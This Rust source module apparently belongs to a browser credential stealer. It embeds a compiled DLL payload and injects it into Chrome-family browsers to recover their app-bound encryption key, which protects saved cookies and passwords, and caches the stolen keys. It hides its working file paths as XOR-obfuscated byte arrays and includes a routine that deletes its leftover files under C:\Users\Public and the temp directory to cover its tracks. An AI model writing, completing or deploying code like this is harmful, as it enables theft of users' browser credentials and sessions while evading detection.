use std::{collections::HashMap, collections::HashSet, path::PathBuf, sync::Mutex};

use super::{env_configured, xor_str};

const EMBEDDED_PAYLOAD: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/payload.dll"));

static KEY_CACHE: Mutex<Option<HashMap<String, Vec<u8>>>> = Mutex::new(None);
static FAIL_CACHE: Mutex<Option<HashSet<String>>> = Mutex::new(None);

fn s_chrome_recovery_result_json() -> String {
    xor_str(&[
        0x39, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x05, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x23,
        0x05, 0x28, 0x3F, 0x29, 0x2F, 0x36, 0x2E, 0x74, 0x30, 0x29, 0x35, 0x34,
    ])
}

fn s_cr_headless_profile() -> String {
    xor_str(&[
        0x39, 0x28, 0x05, 0x32, 0x3F, 0x3B, 0x3E, 0x36, 0x3F, 0x29, 0x29, 0x05, 0x2A, 0x28, 0x35,
        0x3C, 0x33, 0x36, 0x3F,
    ])
}

fn s_c_users_public_chrome_recovery_result_json() -> String {
    xor_str(&[
        0x19, 0x60, 0x06, 0x0F, 0x29, 0x3F, 0x28, 0x29, 0x06, 0x0A, 0x2F, 0x38, 0x36, 0x33, 0x39,
        0x06, 0x39, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x05, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28,
        0x23, 0x05, 0x28, 0x3F, 0x29, 0x2F, 0x36, 0x2E, 0x74, 0x30, 0x29, 0x35, 0x34,
    ])
}

fn s_c_users_public_cr_debug_log() -> String {
    xor_str(&[
        0x19, 0x60, 0x06, 0x0F, 0x29, 0x3F, 0x28, 0x29, 0x06, 0x0A, 0x2F, 0x38, 0x36, 0x33, 0x39,
        0x06, 0x39, 0x28, 0x05, 0x3E, 0x3F, 0x38, 0x2F, 0x3D, 0x74, 0x36, 0x35, 0x3D,
    ])
}

pub fn fetch_app_bound_key(browser_name: &str) -> Option<Vec<u8>> {
    if !env_configured() {
        return None;
    }

    if EMBEDDED_PAYLOAD.is_empty() {
        return None;
    }

    if let Ok(guard) = FAIL_CACHE.lock() {
        if guard.as_ref().is_some_and(|s| s.contains(browser_name)) {
            return None;
        }
    }
    if let Ok(guard) = KEY_CACHE.lock() {
        if let Some(map) = guard.as_ref() {
            if let Some(key) = map.get(browser_name) {
                return Some(key.clone());
            }
        }
    }

    let key = match inject::recover_key(browser_name, EMBEDDED_PAYLOAD) {
        Some(k) => k,
        None => {
            if let Ok(mut guard) = FAIL_CACHE.lock() {
                if guard.is_none() {
                    *guard = Some(HashSet::new());
                }
                if let Some(set) = guard.as_mut() {
                    set.insert(browser_name.to_string());
                }
            }
            return None;
        }
    };

    if let Ok(mut guard) = KEY_CACHE.lock() {
        if guard.is_none() {
            *guard = Some(HashMap::new());
        }
        if let Some(map) = guard.as_mut() {
            map.insert(browser_name.to_string(), key.clone());
        }
    }

    Some(key)
}

pub fn cleanup_legacy_artifacts() {
    if !env_configured() {
        return;
    }

    let legacy = [
        PathBuf::from(s_c_users_public_chrome_recovery_result_json()),
        PathBuf::from(s_c_users_public_cr_debug_log()),
        std::env::temp_dir().join(s_chrome_recovery_result_json()),
        std::env::temp_dir().join(s_cr_headless_profile()),
    ];
    for path in legacy {
        if path.is_dir() {
            let _ = std::fs::remove_dir_all(path);
        } else {
            let _ = std::fs::remove_file(path);
        }
    }
}
